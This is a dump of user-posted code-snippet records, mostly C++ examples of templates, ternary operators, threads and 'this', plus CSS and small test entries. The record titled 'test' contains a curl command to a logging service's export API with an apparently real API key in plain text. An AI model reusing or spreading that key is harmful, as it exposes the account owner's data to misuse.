    "id": 3970,
    "keyword": null,
    "link": null,
    "title": " template function in class c++",
    "description": "// function template #include <iostream> using namespace std;  template <class T> T GetMax (T a, T b) {   T result;   result = (a>b)? a : b;   return (result); }  int main () {   int i=5, j=6, k;   long l=10, m=5, n;   k=GetMax<int>(i,j);   n=GetMax<long>(l,m);   cout << k << endl;   cout << n << endl;   return 0; }\n// template specialization #include <iostream> using namespace std;  // class template: template <class T> class mycontainer {     T element;   public:     mycontainer (T arg) {element=arg;}     T increase () {return ++element;} };  // class template specialization: template <> class mycontainer <char> {     char element;   public:     mycontainer (char arg) {element=arg;}     char uppercase ()     {       if ((element>='a')&&(element<='z'))       element+='A'-'a';       return element;     } };  int main () {   mycontainer<int> myint (7);   mycontainer<char> mychar ('j');   cout << myint.increase() << endl;   cout << mychar.uppercase() << endl;   return 0; }\nclass Object { public:     template<class T>     void DoX(){} }; \n",
    "reg_date": "2021-10-12T11:43:52.000Z"
  },
  {
    "id": 3971,
    "keyword": null,
    "link": null,
    "title": " template in c++",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }\ntemplate <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }  void main() {   int a = 6;   int b = 42;   swap<int>(a, b);   printf(\"a=%d, b=%d\\n\", a, b);      // Implicit template parameter deduction   double f = 5.5;   double g = 42.0;   swap(f, g);   printf(\"f=%f, g=%f\\n\", f, g); }  /* Output: a=42, b=6 f=42.0, g=5.5 */\n#include <iostream> using namespace std;  template <typename T> void Swap(T &n1, T &n2) { \tT temp; \ttemp = n1; \tn1 = n2; \tn2 = temp; }  int main() { \tint i1 = 1, i2 = 2; \tfloat f1 = 1.1, f2 = 2.2; \tchar c1 = 'a', c2 = 'b';  \tcout << \"Before passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \tSwap(i1, i2); \tSwap(f1, f2); \tSwap(c1, c2);          cout << \"\\n\\nAfter passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \treturn 0; } \n// template function template <class T> T Large(T n1, T n2) { \treturn (n1 > n2) ? n1 : n2; }\ntemplate <typename T> void Swap(T &n1, T &n2) { \tT temp; \ttemp = n1; \tn1 = n2; \tn2 = temp; }\ntemplate class  Graph<string>;\n",
    "reg_date": "2021-10-12T11:43:52.000Z"
  },
  {
    "id": 3972,
    "keyword": null,
    "link": null,
    "title": " template member functions in cpp files",
    "description": "template <class T> void foo<T>::bar(const T &t) { }  // Explicit template instantiation template class foo<int>; \n",
    "reg_date": "2021-10-12T11:43:52.000Z"
  },
  {
    "id": 3973,
    "keyword": null,
    "link": null,
    "title": " templates c++",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }\ntemplate <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }  void main() {   int a = 6;   int b = 42;   swap<int>(a, b);   printf(\"a=%d, b=%d\\n\", a, b);      // Implicit template parameter deduction   double f = 5.5;   double g = 42.0;   swap(f, g);   printf(\"f=%f, g=%f\\n\", f, g); }  /* Output: a=42, b=6 f=42.0, g=5.5 */\n#include <iostream> using namespace std;  template <typename T> void Swap(T &n1, T &n2) { \tT temp; \ttemp = n1; \tn1 = n2; \tn2 = temp; }  int main() { \tint i1 = 1, i2 = 2; \tfloat f1 = 1.1, f2 = 2.2; \tchar c1 = 'a', c2 = 'b';  \tcout << \"Before passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \tSwap(i1, i2); \tSwap(f1, f2); \tSwap(c1, c2);          cout << \"\\n\\nAfter passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \treturn 0; } \n// function template #include <iostream> using namespace std;  template <class T> T GetMax (T a, T b) {   T result;   result = (a>b)? a : b;   return (result); }  int main () {   int i=5, j=6, k;   long l=10, m=5, n;   k=GetMax<int>(i,j);   n=GetMax<long>(l,m);   cout << k << endl;   cout << n << endl;   return 0; }\n// template function template <class T> T Large(T n1, T n2) { \treturn (n1 > n2) ? n1 : n2; }\ntemplate  < typename  T >  inline  T  max ( T  a ,  T  b )  {      return  a  >  b  ?  a  :  b ;  }  int  main ()  {      // Isso chamar&aacute; max <int> por dedu&ccedil;&atilde;o impl&iacute;cita do argumento.      std :: cout  <<  max ( 3 ,  7 )  <<  std :: endl ;      // Isso chamar&aacute; max <double> por dedu&ccedil;&atilde;o impl&iacute;cita do argumento.      std :: cout  <<  max ( 3.0 ,  7.0 )  <<  std :: endl ;      // Isso depende do compilador. Alguns compiladores lidam com isso definindo uma      fun&ccedil;&atilde;o de      modelo // como double max <double> (double a, double b) ;, enquanto em alguns compiladores // precisamos convert&ecirc;-lo explicitamente, como std :: cout << max <double> (3,7,0);      std :: cout  <<  max ( 3 ,  7.0 )  <<  std :: endl ;      std :: cout  <<  max < double > ( 3 ,  7.0 )  <<  std :: endl ;      return  0 ;  }\n",
    "reg_date": "2021-10-12T11:43:52.000Z"
  },
  {
    "id": 3974,
    "keyword": null,
    "link": null,
    "title": " templates classes in c++",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }\n#include <iostream> using namespace std;  template <typename T> void Swap(T &n1, T &n2) { \tT temp; \ttemp = n1; \tn1 = n2; \tn2 = temp; }  int main() { \tint i1 = 1, i2 = 2; \tfloat f1 = 1.1, f2 = 2.2; \tchar c1 = 'a', c2 = 'b';  \tcout << \"Before passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \tSwap(i1, i2); \tSwap(f1, f2); \tSwap(c1, c2);          cout << \"\\n\\nAfter passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \treturn 0; } \n// function template #include <iostream> using namespace std;  template <class T> T GetMax (T a, T b) {   T result;   result = (a>b)? a : b;   return (result); }  int main () {   int i=5, j=6, k;   long l=10, m=5, n;   k=GetMax<int>(i,j);   n=GetMax<long>(l,m);   cout << k << endl;   cout << n << endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:43:52.000Z"
  },
  {
    "id": 3975,
    "keyword": null,
    "link": null,
    "title": " templates of templates c++",
    "description": "namespace std {   template<typename t> struct hash<MyClass<t>>   {   \tsize_t operator() (const MyClass<t>& c) const;   } }  // You can also do things like  template<template<typename t> class type> func_name<type<t>>();\n",
    "reg_date": "2021-10-12T11:43:52.000Z"
  },
  {
    "id": 3976,
    "keyword": null,
    "link": null,
    "title": " terminal compile c++",
    "description": "g++ -o file file.cpp //or file.c\n",
    "reg_date": "2021-10-12T11:43:53.000Z"
  },
  {
    "id": 3977,
    "keyword": null,
    "link": null,
    "title": " termios.h c++ download",
    "description": "/* Copyright (C) 1991,92,93,94,96,97,98,99, 2003 Free Software Foundation, Inc.    This file is part of the GNU C Library.     The GNU C Library is free software; you can redistribute it and/or    modify it under the terms of the GNU Lesser General Public    License as published by the Free Software Foundation; either    version 2.1 of the License, or (at your option) any later version.     The GNU C Library is distributed in the hope that it will be useful,    but WITHOUT ANY WARRANTY; without even the implied warranty of    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU    Lesser General Public License for more details.     You should have received a copy of the GNU Lesser General Public    License along with the GNU C Library; if not, write to the Free    Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA    02111-1307 USA.  */  /*  *        POSIX Standard: 7.1-2 General Terminal Interface        <termios.h>  */  #ifndef        _TERMIOS_H #define        _TERMIOS_H        1  #include <features.h> #ifdef __USE_UNIX98 /* We need `pid_t'.  */ # include <bits/types.h> # ifndef __pid_t_defined typedef __pid_t pid_t; #  define __pid_t_defined # endif #endif  __BEGIN_DECLS  /* Get the system-dependent definitions of `struct termios', `tcflag_t',    `cc_t', `speed_t', and all the macros specifying the flag bits.  */ #include <bits/termios.h>  #ifdef __USE_BSD /* Compare a character C to a value VAL from the `c_cc' array in a    `struct termios'.  If VAL is _POSIX_VDISABLE, no character can match it.  */ # define CCEQ(val, c)        ((c) == (val) && (val) != _POSIX_VDISABLE) #endif  /* Return the output baud rate stored in *TERMIOS_P.  */ extern speed_t cfgetospeed (__const struct termios *__termios_p) __THROW;  /* Return the input baud rate stored in *TERMIOS_P.  */ extern speed_t cfgetispeed (__const struct termios *__termios_p) __THROW;  /* Set the output baud rate stored in *TERMIOS_P to SPEED.  */ extern int cfsetospeed (struct termios *__termios_p, speed_t __speed) __THROW;  /* Set the input baud rate stored in *TERMIOS_P to SPEED.  */ extern int cfsetispeed (struct termios *__termios_p, speed_t __speed) __THROW;  #ifdef        __USE_BSD /* Set both the input and output baud rates in *TERMIOS_OP to SPEED.  */ extern int cfsetspeed (struct termios *__termios_p, speed_t __speed) __THROW; #endif   /* Put the state of FD into *TERMIOS_P.  */ extern int tcgetattr (int __fd, struct termios *__termios_p) __THROW;  /* Set the state of FD to *TERMIOS_P.    Values for OPTIONAL_ACTIONS (TCSA*) are in <bits/termios.h>.  */ extern int tcsetattr (int __fd, int __optional_actions,                       __const struct termios *__termios_p) __THROW;   #ifdef        __USE_BSD /* Set *TERMIOS_P to indicate raw mode.  */ extern void cfmakeraw (struct termios *__termios_p) __THROW; #endif  /* Send zero bits on FD.  */ extern int tcsendbreak (int __fd, int __duration) __THROW;  /* Wait for pending output to be written on FD.     This function is a cancellation point and therefore not marked with    __THROW.  */ extern int tcdrain (int __fd);  /* Flush pending data on FD.    Values for QUEUE_SELECTOR (TC{I,O,IO}FLUSH) are in <bits/termios.h>.  */ extern int tcflush (int __fd, int __queue_selector) __THROW;  /* Suspend or restart transmission on FD.    Values for ACTION (TC[IO]{OFF,ON}) are in <bits/termios.h>.  */ extern int tcflow (int __fd, int __action) __THROW;   #ifdef __USE_UNIX98 /* Get process group ID for session leader for controlling terminal FD.  */ extern __pid_t tcgetsid (int __fd) __THROW; #endif   #ifdef __USE_BSD # include <sys/ttydefaults.h> #endif  __END_DECLS  #endif /* termios.h  */ \n",
    "reg_date": "2021-10-12T11:43:53.000Z"
  },
  {
    "id": 3978,
    "keyword": null,
    "link": null,
    "title": " ternary operator c++",
    "description": "(condition) ? (if_true) : (if_false)\n<condition> ? <true-case-code> : <false-case-code>; \n//(expression 1) ? expression 2 : expression 3 //If expression 1 evaluates to true, then expression 2 is evaluated.    int x, y = 10;     x = (y < 10) ? 30 : 40;    cout << \"value of x: \" << x << endl; //prints 40      \n//one ternary operator statement ? if-true-do-this : if-false-do-this; //if-statement version if(statement){   if-true-do-this; }else{   if-false-do-this; }   //nested ternary operator statement-1 ? if-true-do-this-1 : statement-2 ? if-true-do-this-2 : if-false-do-this-2; //if-statement version if(statement-1){   if-true-do-this-1; }else {   if(statement-2){     if-true-do-this-2;   }else{     if-false-do-this-2;   } } \n(n1 > n2) ? n1 : n2;              OR n1 > n2 ? n1 : n2;\nx = condition ? expression1 : expression2  // Example: double x = 1 > 0 ? 10 : 20; // put any value\n",
    "reg_date": "2021-10-12T11:43:53.000Z"
  },
  {
    "id": 3979,
    "keyword": null,
    "link": null,
    "title": " ternary operator in c++",
    "description": "(condition) ? (if_true) : (if_false)\n<condition> ? <true-case-code> : <false-case-code>; \n//one ternary operator statement ? if-true-do-this : if-false-do-this; //if-statement version if(statement){   if-true-do-this; }else{   if-false-do-this; }   //nested ternary operator statement-1 ? if-true-do-this-1 : statement-2 ? if-true-do-this-2 : if-false-do-this-2; //if-statement version if(statement-1){   if-true-do-this-1; }else {   if(statement-2){     if-true-do-this-2;   }else{     if-false-do-this-2;   } } \n(n1 > n2) ? n1 : n2;              OR n1 > n2 ? n1 : n2;\nx = condition ? expression1 : expression2  // Example: double x = 1 > 0 ? 10 : 20; // put any value\n",
    "reg_date": "2021-10-12T11:43:53.000Z"
  },
  {
    "id": 3980,
    "keyword": null,
    "link": null,
    "title": " tesselation",
    "description": "#include<iostream> int main(){   std::cout<<\"Please enter the number of rows:\\t\";   int rows;   std::cin>>rows;   std::cout<<\"Please enter the number of columns:\\t\";     int columns;                                                      std::cin>>columns;   unsigned int n=3;   unsigned int k=4;   unsigned int n_reserve{0};                  unsigned int k_reserve{0};   unsigned int which_row=1;   if(columns>1){       n=(columns)*6-n;       k=((columns)*6)-(k)+2;       n_reserve=n;       k_reserve=k;   }                                              for(int odd{1};odd<=(rows*3);++odd){             for(int j{columns*6};j>=1;--j){           if(j==n){               std::cout<<\"\\\\\"; // ==>  \"/\"               if(n>3&&columns>1){n-=6;}           }else if(j==k){               std::cout<<\"/\";//  ==> \"\\\"               if(k>4&&columns>1){k-=6;}           }else if(odd%3==0){               std::cout<<'_';           }else{               std::cout<<\" \";           }         }std::cout<<std::endl;         if(columns>1){           n=--n_reserve;           k=++k_reserve;           ++n;--k;         }           --n;           ++k;       if(odd%3==0){++which_row;}       if(which_row%2==0&&odd%3==0)       {// 29421  796842 */ ;)         n_reserve=(columns)*6;         k_reserve=((columns)*6)-5;         n=n_reserve;         k=k_reserve;       }            }     return 0; } \n",
    "reg_date": "2021-10-12T11:43:53.000Z"
  },
  {
    "id": 3981,
    "keyword": null,
    "link": null,
    "title": " tessellation triangle",
    "description": "#include<iostream> int main(){   std::cout<<\"Please enter the number of rows:\\t\";   int rows;   std::cin>>rows;   std::cout<<\"Please enter the number of columns:\\t\";     int columns;                                                      std::cin>>columns;   unsigned int n=3;   unsigned int k=4;   unsigned int n_reserve{0};                  unsigned int k_reserve{0};   unsigned int which_row=1;   if(columns>1){       n=(columns)*6-n;       k=((columns)*6)-(k)+2;       n_reserve=n;       k_reserve=k;   }                                              for(int odd{1};odd<=(rows*3);++odd){             for(int j{columns*6};j>=1;--j){           if(j==n){               std::cout<<\"\\\\\"; // ==>  \"/\"               if(n>3&&columns>1){n-=6;}           }else if(j==k){               std::cout<<\"/\";//  ==> \"\\\"               if(k>4&&columns>1){k-=6;}           }else if(odd%3==0){               std::cout<<'_';           }else{               std::cout<<\" \";           }         }std::cout<<std::endl;         if(columns>1){           n=--n_reserve;           k=++k_reserve;           ++n;--k;         }           --n;           ++k;       if(odd%3==0){++which_row;}       if(which_row%2==0&&odd%3==0)       {// 29421  796842 */ ;)         n_reserve=(columns)*6;         k_reserve=((columns)*6)-5;         n=n_reserve;         k=k_reserve;       }            }     return 0; } \n",
    "reg_date": "2021-10-12T11:43:53.000Z"
  },
  {
    "id": 3982,
    "keyword": null,
    "link": null,
    "title": " test",
    "description": "seems like your internet connection works...\nnoelgay \nIf you are reading this your wifi is working\nhey! seems like your internet connection works...\ntemplate < class T, class Alloc = allocator<T> > class vector; // generic template \n$sum = 0; for($i = 1; $i <= 10; $i++){     if($i == 10){         echo $i;     } else {         echo $i.\" + \";     }     $sum = $sum + $i; } echo \" = \".$sum; \nGET https://rtddev.service-now.com/api/now/import/{stagingTableName}/{sys_id}\ncurl \"https://api.logdna.com/v1/export?from=$(($(date +%s)-86400))000&to=$(date +%s)000&levels=warn\" \\ -u 01febba9823c455f8a4361b92ea0f91d:\n\"sfs\" \n200 OK\n",
    "reg_date": "2021-10-12T11:43:53.000Z"
  },
  {
    "id": 3983,
    "keyword": null,
    "link": null,
    "title": " test3",
    "description": "Digrafo g(V); int aristas = 0; for (int v = 0; v < V; ++v)      aristas += g.ady(v).size(); cout << aristas << '\\n'; \n",
    "reg_date": "2021-10-12T11:43:53.000Z"
  },
  {
    "id": 3984,
    "keyword": null,
    "link": null,
    "title": " test when c++ destructor is called",
    "description": "// order_of_destruction.cpp #include <cstdio>  struct A1      { virtual ~A1() { printf(\"A1 dtor\\n\"); } }; struct A2 : A1 { virtual ~A2() { printf(\"A2 dtor\\n\"); } }; struct A3 : A2 { virtual ~A3() { printf(\"A3 dtor\\n\"); } };  struct B1      { ~B1() { printf(\"B1 dtor\\n\"); } }; struct B2 : B1 { ~B2() { printf(\"B2 dtor\\n\"); } }; struct B3 : B2 { ~B3() { printf(\"B3 dtor\\n\"); } };  int main() {    A1 * a = new A3;    delete a;    printf(\"\\n\");     B1 * b = new B3;    delete b;    printf(\"\\n\");     B3 * b2 = new B3;    delete b2; }  Output: A3 dtor A2 dtor A1 dtor  B1 dtor  B3 dtor B2 dtor B1 dtor \n",
    "reg_date": "2021-10-12T11:43:54.000Z"
  },
  {
    "id": 3985,
    "keyword": null,
    "link": null,
    "title": " texorpdfstring math in title latex",
    "description": "\\section{SECTION with math \\texorpdfstring{$\\mu$}{\\textmu}}\n",
    "reg_date": "2021-10-12T11:43:54.000Z"
  },
  {
    "id": 3986,
    "keyword": null,
    "link": null,
    "title": " text shadow css",
    "description": "/* offset-x | offset-y | blur-radius | color */ text-shadow: 1px 1px 2px black;  /* color | offset-x | offset-y | blur-radius */ text-shadow: #fc0 1px 0 10px;  /* offset-x | offset-y | color */ text-shadow: 5px 5px #558abb;  /* color | offset-x | offset-y */ text-shadow: white 2px 5px;  /* offset-x | offset-y /* Use defaults for color and blur-radius */ text-shadow: 5px 10px;  /* Global values */ text-shadow: inherit; text-shadow: initial; text-shadow: unset; \n/******************************************************************************  Welcome to GDB Online. GDB online is an online compiler and debugger tool for C, C++, Python, Java, PHP, Ruby, Perl, C#, VB, Swift, Pascal, Fortran, Haskell, Objective-C, Assembly, HTML, CSS, JS, SQLite, Prolog. Code, Compile, Run and Debug online from anywhere in world.  *******************************************************************************/ #include <stdio.h>  int main() {   float x;   x = 10.35;   printf(\"%f\",x);      return 0; }  \n /*           x   y  blur color */ text-shadow: 1px 1px 1px  #000000;\n/* offset-x | offset-y | blur-radius | color */ text-shadow: 1px 1px 2px black;  /* color | offset-x | offset-y | blur-radius */ text-shadow: #fc0 1px 0 10px;  /* offset-x | offset-y | color */ text-shadow: 5px 5px #558abb;  /* color | offset-x | offset-y */ text-shadow: white 2px 5px;  /* offset-x | offset-y /* Use defaults for color and blur-radius */ text-shadow: 5px 10px;  /* Global values */ text-shadow: inherit; text-shadow: initial; text-shadow: unset;\nbackground: #354962; color: #FFFFFF; font-family: 'Paytone One'; text-shadow: #2A3D4E 1px 1px,#2A3D4E -0px 0px,#2A3D4E -1px 1px,#2A3D4E -2px 2px,#2A3D4E -3px 3px,#2A3D4E -4px 4px,#2A3D4E -5px 5px,#2A3D4E -6px 6px,#2A3D4E -7px 7px,#2A3D4E -8px 8px,#2A3D4E -9px 9px; /* just copy this */\nnone | <shadow-t># where  <shadow-t> = [ <length>{2,3} && <color>? ]  where  <color> = <rgb()> | <rgba()> | <hsl()> | <hsla()> | <hex-color> | <named-color> | currentcolor | <deprecated-system-color>  where  <rgb()> = rgb( <percentage>{3} [ / <alpha-value> ]? ) | rgb( <number>{3} [ / <alpha-value> ]? ) | rgb( <percentage>#{3} , <alpha-value>? ) | rgb( <number>#{3} , <alpha-value>? ) <rgba()> = rgba( <percentage>{3} [ / <alpha-value> ]? ) | rgba( <number>{3} [ / <alpha-value> ]? ) | rgba( <percentage>#{3} , <alpha-value>? ) | rgba( <number>#{3} , <alpha-value>? ) <hsl()> = hsl( <hue> <percentage> <percentage> [ / <alpha-value> ]? ) | hsl( <hue>, <percentage>, <percentage>, <alpha-value>? ) <hsla()> = hsla( <hue> <percentage> <percentage> [ / <alpha-value> ]? ) | hsla( <hue>, <percentage>, <percentage>, <alpha-value>? )  where  <alpha-value> = <number> | <percentage> <hue> = <number> | <angle>                                                                                                           \n/* offset-x | offset-y | blur-radius | color */ text-shadow: 1px 1px 2px black;  /* color | offset-x | offset-y | blur-radius */ text-shadow: #fc0 1px 0 10px;  /* offset-x | offset-y | color */ text-shadow: 5px 5px #558abb;  /* color | offset-x | offset-y */ text-shadow: white 2px 5px;  /* offset-x | offset-y /* Use defaults for color and blur-radius */ text-shadow: 5px 10px;  /* Global values */ text-shadow: inherit; text-shadow: initial; text-shadow: unset;\n# Python code # basic.show_leds(\"\"\"   . # # # .   . . . # .   . # # # .   . # . . .   . # # # .   \"\"\") basic.pause(2000) basic.show_number(3) basic.pause(2000) basic.show_leds(\"\"\"   . # . # .   . # . # .   . # # # .   . . . # .   . . . # .   \"\"\") basic.pause(3000) basic.show_leds(\"\"\"   . # # # .   . # . . .   . # # # .   . . . # .   . # # # .   \"\"\") basic.show_number(6) basic.pause(3000) basic.show_number(7) basic.pause(1000) basic.show_number(8) basic.pause(1000) basic.show_number(9) basic.pause(1000) basic.show_number(0) basic.pause(1000) basic.show_leds(\"\"\"   . . # . .   . # # . .   . . # . .   . . # . .   . . # . .   \"\"\") basic.pause(1000)  basic.show_number(0) basic.pause(1000) basic.show_leds(\"\"\"   . . # . .   . # # . .   . . # . .   . . # . .   . . # . .   \"\"\") basic.pause(1000) basic.show_leds(\"\"\"   . # # # .   . . . # .   . # # # .   . # . . .   . # # # .   \"\"\") basic.pause(2000) basic.show_number(3) basic.pause(2000) basic.show_leds(\"\"\"   . # . # .   . # . # .   . # # # .   . . . # .   . . . # .   \"\"\") basic.pause(3000) basic.show_leds(\"\"\"   . # # # .   . # . . .   . # # # .   . . . # .   . # # # .   \"\"\") basic.show_number(6) basic.pause(3000) basic.show_number(7) basic.pause(1000) basic.show_number(8) basic.pause(1000) basic.show_number(9) basic.pause(1000)  def on_forever():   pass basic.forever(on_forever) \n/******************************************************************************  Welcome to GDB Online. GDB online is an online compiler and debugger tool for C, C++, Python, PHP, Ruby,  C#, VB, Perl, Swift, Prolog, Javascript, Pascal, HTML, CSS, JS Code, Compile, Run and Debug online from anywhere in world.  *******************************************************************************/ #include <stdio.h>  int main() {     printf(\"(*/&omega;＼*)(❁&acute;◡`❁)\\t\\a\\n\");      return 0; } \n/******************************************************************************  Welcome to GDB Online. GDB online is an online compiler and debugger tool for C, C++, Python, Java, PHP, Ruby, Perl, C#, VB, Swift, Pascal, Fortran, Haskell, Objective-C, Assembly, HTML, CSS, JS, SQLite, Prolog. Code, Compile, Run and Debug online from anywhere in world.  *******************************************************************************/ #include <stdio.h>  int main() { int x; x= 35; printf(\" x is = %i\\n\",x);     return 0; }  \n",
    "reg_date": "2021-10-12T11:43:54.000Z"
  },
  {
    "id": 3987,
    "keyword": null,
    "link": null,
    "title": " the amount of input is unknown",
    "description": "while (cin >> x) { // code } \n",
    "reg_date": "2021-10-12T11:43:54.000Z"
  },
  {
    "id": 3988,
    "keyword": null,
    "link": null,
    "title": " the first n approximations of number pi in c++",
    "description": "/* This program calculates the first n approximations of the number pi from the infinite series pi = 4 - 4/3 + 4/5 - 4/7 + 4/9 - 4/11 + ... All the approximations and displayed */  #include <iostream> #include <iomanip>  using namespace std;  int main() {  \tint n{ 170000 }, index=-1; \tdouble approximation{ 1 };  \tcout << \"approximation 0: 4\" << endl; \t  \tfor (int i = 1; i <= n; i++) {  \t\tapproximation += pow(-1, i) / static_cast<double>(2 * i + 1); \t\tcout << \"approximation \" << i << \": \"; \t\tcout << setprecision(9) << setw(10) << left << fixed; // do not remove fixed to see all 9 decimal places \t\tcout <<  4 * approximation << endl;  \t\tif (static_cast<int>(4 * approximation * 100000) == 314159 and index == -1) { \t\t\tcout << \"The \" << i << \"th approximation begins with 3.14159\\n\"; \t\t\tindex = i;  \t\t\tchar k; \t\t\tcout << \"Press Enter to continue\"; \t\t\tcin >> k; \t\t} \t}  \tcout << \"The \" << index << \"th approximation begins with 3.14159\\n\"; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:43:54.000Z"
  },
  {
    "id": 3989,
    "keyword": null,
    "link": null,
    "title": " the number of ones int bitset",
    "description": "bitset<10> s(string(\"0010011010\")); cout << s.count() << \"\\n\"; // 4\n",
    "reg_date": "2021-10-12T11:43:54.000Z"
  },
  {
    "id": 3990,
    "keyword": null,
    "link": null,
    "title": " the question for me",
    "description": "14 for (int &itemRef : d){\n",
    "reg_date": "2021-10-12T11:43:54.000Z"
  },
  {
    "id": 3991,
    "keyword": null,
    "link": null,
    "title": " the statement vector vector int matrix(100 vector int (50 100) ) declares",
    "description": "vector < int > (50, 100) declares a vector X of type int with 50 elements each initialized to 100 and matrix consists of 100 vectors of type int each equal to X. The web browser is considering the < int > without spaces between < and int and > as some HTML tag.\n",
    "reg_date": "2021-10-12T11:43:54.000Z"
  },
  {
    "id": 3992,
    "keyword": null,
    "link": null,
    "title": " this in c++",
    "description": "Every object in C++ has access to its own address through an important pointer called this pointer. The this pointer is an implicit parameter to all member functions. Therefore, inside a member function, this may be used to refer to the invoking object.  Example: #include <iostream> using namespace std; class Demo { private:   int num;   char ch; public:   void setMyValues(int num, char ch){     this->num =num;     this->ch=ch;   }   void displayMyValues(){     cout<<num<<endl;     cout<<ch;   } }; int main(){   Demo obj;   obj.setMyValues(100, 'A');   obj.displayMyValues();   return 0; } \n#include <iostream> class Entity { public: \tint x, y; \tEntity(int x, int y) \t{ \t\tEntity*const e = this;// is a ptr to the the new instance of class  \t\t//inside non const method this == Entity*const \t\t//e->x = 5; \t\t//e->y =6; \t\tthis->x = x; \t\tthis->y = x; \t} \tint GetX()const \t{ \t\tconst Entity* e = this;//inside const function this is = const Entity* \t} };  int main()  { \tEntity e1(1,2); }\n",
    "reg_date": "2021-10-12T11:43:54.000Z"
  },
  {
    "id": 3993,
    "keyword": null,
    "link": null,
    "title": " this is my p phone number in punjabi",
    "description": "five years ago when you get the job description for your time \n",
    "reg_date": "2021-10-12T11:43:55.000Z"
  },
  {
    "id": 3994,
    "keyword": null,
    "link": null,
    "title": " this keyword in cpp",
    "description": "#include <iostream> class Entity { public: \tint x, y; \tEntity(int x, int y) \t{ \t\tEntity*const e = this;// is a ptr to the the new instance of class  \t\t//inside non const method this == Entity*const \t\t//e->x = 5; \t\t//e->y =6; \t\tthis->x = x; \t\tthis->y = x; \t} \tint GetX()const \t{ \t\tconst Entity* e = this;//inside const function this is = const Entity* \t} };  int main()  { \tEntity e1(1,2); }\n this is a keyword that refers to the current instance of the class.   There can be 3 main usage of this keyword in C++. It can be used to   pass current object as a parameter to another method.   It can be used to refer current class instance variable.     #include <iostream> using namespace std; class Demo { private:   int num;   char ch; public:   void setMyValues(int num, char ch){     this->num =num;     this->ch=ch;   }   void displayMyValues(){     cout<<num<<endl;     cout<<ch;   } }; int main(){   Demo obj;   obj.setMyValues(100, 'A');   obj.displayMyValues();   return 0; }  Output:-    \t100 \tA\n",
    "reg_date": "2021-10-12T11:43:55.000Z"
  },
  {
    "id": 3995,
    "keyword": null,
    "link": null,
    "title": " thread c++",
    "description": "// thread example #include <iostream>       // std::cout #include <thread>         // std::thread   void foo()  {   // do stuff... }  void bar(int x) {   // do stuff... }  int main()  {   std::thread first (foo);     // spawn new thread that calls foo()   std::thread second (bar,0);  // spawn new thread that calls bar(0)    std::cout << \"main, foo and bar now execute concurrently...\\n\";    // synchronize threads:   first.join();                // pauses until first finishes   second.join();               // pauses until second finishes    std::cout << \"foo and bar completed.\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:43:55.000Z"
  },
  {
    "id": 3996,
    "keyword": null,
    "link": null,
    "title": " thread c++ member function",
    "description": "myThreads[i] = std::thread(&Car::start, myCar);\n",
    "reg_date": "2021-10-12T11:43:55.000Z"
  },
  {
    "id": 3997,
    "keyword": null,
    "link": null,
    "title": " thread group c++",
    "description": "  std::vector<std::thread> grp;    // to create threads   grp.emplace_back(functor); // pass in the argument of std::thread()    void join_all() {     for (auto& thread : grp)       if (thread.joinable())         thread.join();   } \n",
    "reg_date": "2021-10-12T11:43:55.000Z"
  },
  {
    "id": 3998,
    "keyword": null,
    "link": null,
    "title": " three-way comparison",
    "description": "#include <compare> #include <iostream>   int main() {     double foo = -0.0;     double bar = 0.0;       auto res = foo <=> bar;       if (res < 0)         std::cout << \"-0 is less than 0\";     else if (res == 0)         std::cout << \"-0 and 0 are equal\";     else if (res > 0)         std::cout << \"-0 is greater than 0\"; }\n",
    "reg_date": "2021-10-12T11:43:55.000Z"
  },
  {
    "id": 3999,
    "keyword": null,
    "link": null,
    "title": " three-way comparison c++",
    "description": "\tlhs <=> rhs //Since C++20  The expression returns an object that: - compares <0 if lhs < rhs - compares >0 if lhs > rhs - compares ==0 if lhs and rhs are equal/equivalent.\n",
    "reg_date": "2021-10-12T11:43:55.000Z"
  },
  {
    "id": 4000,
    "keyword": null,
    "link": null,
    "title": " three d array in c++",
    "description": "//[2] is elements; [3] is rows in elements; [4] is column in elemnents  int a[2][3][2]= {         //Element 0         { {1, 2},            {2, 3},            {4, 5}                       },                           // Element 1         { {6, 7},            {8, 9},            {10, 11}                       }     };          cout << a[0][1][1]; // Prints 3\n",
    "reg_date": "2021-10-12T11:43:55.000Z"
  },
  {
    "id": 4001,
    "keyword": null,
    "link": null,
    "title": " three dimensional array c++",
